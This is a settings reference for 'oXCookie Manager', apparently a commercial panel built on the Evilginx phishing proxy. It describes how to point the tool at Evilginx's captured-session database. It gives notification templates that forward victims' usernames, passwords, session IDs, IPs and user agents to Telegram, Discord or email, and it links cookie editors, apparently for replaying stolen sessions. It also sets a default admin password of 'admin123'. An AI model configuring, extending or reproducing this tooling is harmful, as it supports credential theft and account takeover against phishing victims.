# Default Settings Reference

This document contains all default settings and templates used in oXCookie Manager.

## Default Admin Account

- **Username**: `admin`
- **Password**: `admin123`
- **Role**: `super_admin`

⚠️ **Change this password immediately after first deployment!**

## Database Path Configuration

**The database path is configured via the Super Admin UI, not in source code.**

1. Login as Super Admin
2. Go to **⚙️ Configuration**
3. Set **Database File Path** to your Evilginx database file location

The `DEFAULT_DB_PATH` in `app.py` is only used as a fallback if no path is configured in the UI.

## Default Notification Templates

All templates use Telegram MarkdownV2 format. Placeholders are automatically replaced with actual values.

### Incoming Cookie Notification

**Default Template:**
```
*🍪 New Cookie Session Captured\!*

━━━━━━━━━━━━━━━━━━━━
*Session Details:*
• *ID:* `{session_id}`
• *Username:* `{username}`
• *Password:* `{password}`
• *Remote IP:* `{remote_addr}`
• *User Agent:* `{useragent}`
• *Timestamp:* `{time}`
━━━━━━━━━━━━━━━━━━━━
```

**Placeholders:**
- `{session_id}` - Session ID number
- `{username}` - Username from session
- `{password}` - Password from session
- `{remote_addr}` - Remote IP address
- `{useragent}` - User agent string
- `{time}` - Timestamp (formatted)

### Status Update Notification

**Default Template:**
```
*⚙️ System Status Changed*

━━━━━━━━━━━━━━━━━━━━
*Current Status:*
• *Monitoring:* `{monitoring_status}`
• *Telegram:* `{telegram_status}`
• *Discord:* `{discord_status}`
• *Email:* `{email_status}`
*Admin Information:*
• *Admin Status:* `{admin_status}`
• *Subscription End Date:* `{subscription_end_date}`
• *Updated At:* `{time}`
━━━━━━━━━━━━━━━━━
```

**Placeholders:**
- `{monitoring_status}` - Monitoring status (Active/Inactive)
- `{telegram_status}` - Telegram status
- `{discord_status}` - Discord status
- `{email_status}` - Email status
- `{admin_status}` - Admin subscription status
- `{subscription_end_date}` - Subscription expiration date
- `{time}` - Update timestamp

### Subscription Warning Notification

**Default Template:**
```
*⏰ Subscription Expiring Soon\!*

━━━━━━━━━━━━━━━━━━━━
*Account:* `{username}`
*Current Status:* `{status}`
*Expiry Date:* `{expiry_date}`
*Days Remaining:* `{days_remaining}`

Please contact support to renew your subscription\.
━━━━━━━━━━━━━━━━━━━━
```

**Placeholders:**
- `{username}` - Admin username
- `{status}` - Subscription status
- `{expiry_date}` - Expiration date
- `{days_remaining}` - Days until expiration

### Account Extension Notification

**Default Template:**
```
*🎉 Subscription Extended\!*

━━━━━━━━━━━━━━━━━━━━
*Account:* `{username}`
*Days Added:* `{days_added}`
*New Expiry Date:* `{expiry_date}`
*Status:* `{status}`
━━━━━━━━━━━━━━━━━━━━
```

**Placeholders:**
- `{username}` - Admin username
- `{days_added}` - Number of days added
- `{expiry_date}` - New expiration date
- `{status}` - Current subscription status

### Startup Notification

**Default Template:**
```
*🚀 oXCookie Manager Started\!*

System is now online and ready to monitor sessions\.
```

## Default Extension URLs

### Cookie-Editor
- **Chrome**: `https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm`
- **Firefox**: `https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/`

### EditThisCookie
- **Chrome**: `https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg`
- **Firefox**: `https://addons.mozilla.org/en-US/firefox/addon/edit-this-cookie/`

## Configuration File Locations

All configuration files are stored in: `~/.evilginx_monitor/`

- **config.json** - Application configuration (database path, notification settings, etc.)
- **auth.json** - User authentication data (usernames, passwords, roles, subscriptions)

## Default Port

- **Application Port**: `5004`
- **Access URL**: `http://localhost:5004` (or your VPS IP/domain)

## File Permissions

For security, ensure proper file permissions:

```bash
# Config directory
chmod 700 ~/.evilginx_monitor/

# Config files
chmod 600 ~/.evilginx_monitor/config.json
chmod 600 ~/.evilginx_monitor/auth.json

# Application files
chmod 755 /opt/oxcookie-manager/
chmod 644 /opt/oxcookie-manager/*.py
```

## Environment Variables

No environment variables are required by default. All configuration is stored in JSON files.

## Dependencies

See `requirements.txt` for complete list:
- Flask==3.0.0
- Flask-CORS==4.0.0
- python-dotenv==1.0.0
- Werkzeug==3.0.1
- requests==2.31.0

